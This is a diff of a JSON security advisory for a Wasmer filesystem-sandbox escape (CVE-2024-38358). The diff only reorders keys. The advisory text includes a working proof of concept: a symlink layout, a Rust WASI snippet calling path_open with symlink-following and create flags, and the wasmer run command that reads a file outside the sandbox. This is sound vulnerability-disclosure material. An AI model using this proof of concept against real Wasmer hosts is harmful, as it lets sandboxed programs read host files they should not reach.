@@ -1,26 +1,45 @@
 {
-  "id": "GHSA-55f3-3qvg-8pv5",
-  "summary": "Symlink bypasses filesystem sandbox",
-  "details": "### Summary\n\nIf the preopened directory has a symlink pointing outside, WASI programs can traverse the symlink and access host filesystem if the caller sets both `oflags::creat` and `rights::fd_write`. Programs can also crash the runtime by creating a symlink pointing outside with `path_symlink` and `path_open`ing the link.\n\n### Details\n\n\n\n### PoC\nSetup a filesystem as follows.\n\n```\n.\n\u251c\u2500\u2500 outside.file\n\u2514\u2500\u2500 preopen\n    \u2514\u2500\u2500 dir\n        \u2514\u2500\u2500 file -> ../../outside.file\n```\n\nCompile this Rust snippet with `wasi` v0.11 (for the preview1 API).\n\n```rust\nfn main() {\n    unsafe {\n        let filefd = wasi::path_open(\n            5,\n            wasi::LOOKUPFLAGS_SYMLINK_FOLLOW,\n            \"app/dir/file\",\n            wasi::OFLAGS_CREAT,\n            wasi::RIGHTS_FD_READ | wasi::RIGHTS_FD_WRITE,\n            0,\n            0,\n        )\n        .unwrap();\n        eprintln!(\"filefd: {filefd}\");\n\n        let mut buf = [0u8; 10];\n        let iovs = [wasi::Iovec {\n            buf: buf.as_mut_ptr(),\n            buf_len: buf.len(),\n        }];\n\n        let read = wasi::fd_read(filefd, &iovs).unwrap();\n\n        eprintln!(\"read {read}: {}\", String::from_utf8_lossy(&buf));\n    }\n}\n```\n\nRun the compiled binary with Wasmer preopening `preopen/`:\n\n```\nwasmer run --mapdir /app:preopen a.wasm\n```\n\nThis should not print the contents of the `outside.file`. Other runtimes like Wasmtime can successfully block this call. But Wasmer prints the contents of the file.\n\n",
+  "affected": [
+    {
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-55f3-3qvg-8pv5/GHSA-55f3-3qvg-8pv5.json"
+      },
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "wasmer",
+        "purl": "pkg:cargo/wasmer"
+      },
+      "ranges": [
+        {
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "4.3.1"
+            }
+          ],
+          "type": "SEMVER"
+        }
+      ]
+    }
+  ],
   "aliases": [
     "CVE-2024-38358"
   ],
-  "modified": "2024-06-20T14:14:38Z",
-  "published": "2024-06-07T19:40:00Z",
-  "related": [
-    "CGA-9cpp-q87g-p8fw",
-    "CGA-vc44-q5p6-vgwv",
-    "CVE-2024-38358"
-  ],
   "database_specific": {
-    "nvd_published_at": "2024-06-19T20:15:11Z",
     "cwe_ids": [
       "CWE-22"
     ],
-    "severity": "LOW",
     "github_reviewed": true,
-    "github_reviewed_at": "2024-06-07T19:40:00Z"
+    "github_reviewed_at": "2024-06-07T19:40:00Z",
+    "nvd_published_at": "2024-06-19T20:15:11Z",
+    "severity": "LOW"
   },
+  "details": "### Summary\n\nIf the preopened directory has a symlink pointing outside, WASI programs can traverse the symlink and access host filesystem if the caller sets both `oflags::creat` and `rights::fd_write`. Programs can also crash the runtime by creating a symlink pointing outside with `path_symlink` and `path_open`ing the link.\n\n### Details\n\n\n\n### PoC\nSetup a filesystem as follows.\n\n```\n.\n\u251c\u2500\u2500 outside.file\n\u2514\u2500\u2500 preopen\n    \u2514\u2500\u2500 dir\n        \u2514\u2500\u2500 file -> ../../outside.file\n```\n\nCompile this Rust snippet with `wasi` v0.11 (for the preview1 API).\n\n```rust\nfn main() {\n    unsafe {\n        let filefd = wasi::path_open(\n            5,\n            wasi::LOOKUPFLAGS_SYMLINK_FOLLOW,\n            \"app/dir/file\",\n            wasi::OFLAGS_CREAT,\n            wasi::RIGHTS_FD_READ | wasi::RIGHTS_FD_WRITE,\n            0,\n            0,\n        )\n        .unwrap();\n        eprintln!(\"filefd: {filefd}\");\n\n        let mut buf = [0u8; 10];\n        let iovs = [wasi::Iovec {\n            buf: buf.as_mut_ptr(),\n            buf_len: buf.len(),\n        }];\n\n        let read = wasi::fd_read(filefd, &iovs).unwrap();\n\n        eprintln!(\"read {read}: {}\", String::from_utf8_lossy(&buf));\n    }\n}\n```\n\nRun the compiled binary with Wasmer preopening `preopen/`:\n\n```\nwasmer run --mapdir /app:preopen a.wasm\n```\n\nThis should not print the contents of the `outside.file`. Other runtimes like Wasmtime can successfully block this call. But Wasmer prints the contents of the file.\n\n",
+  "id": "GHSA-55f3-3qvg-8pv5",
+  "modified": "2024-06-20T14:14:38Z",
+  "published": "2024-06-07T19:40:00Z",
   "references": [
     {
       "type": "WEB",
@@ -39,36 +58,17 @@
       "url": "https://github.com/wasmerio/wasmer"
     }
   ],
-  "affected": [
-    {
-      "package": {
-        "name": "wasmer",
-        "ecosystem": "crates.io",
-        "purl": "pkg:cargo/wasmer"
-      },
-      "ranges": [
-        {
-          "type": "SEMVER",
-          "events": [
-            {
-              "introduced": "0"
-            },
-            {
-              "last_affected": "4.3.1"
-            }
-          ]
-        }
-      ],
-      "database_specific": {
-        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/06/GHSA-55f3-3qvg-8pv5/GHSA-55f3-3qvg-8pv5.json"
-      }
-    }
+  "related": [
+    "CGA-9cpp-q87g-p8fw",
+    "CGA-vc44-q5p6-vgwv",
+    "CVE-2024-38358"
   ],
   "schema_version": "1.6.0",
   "severity": [
     {
-      "type": "CVSS_V3",
-      "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
+      "type": "CVSS_V3"
     }
-  ]
+  ],
+  "summary": "Symlink bypasses filesystem sandbox"
 }
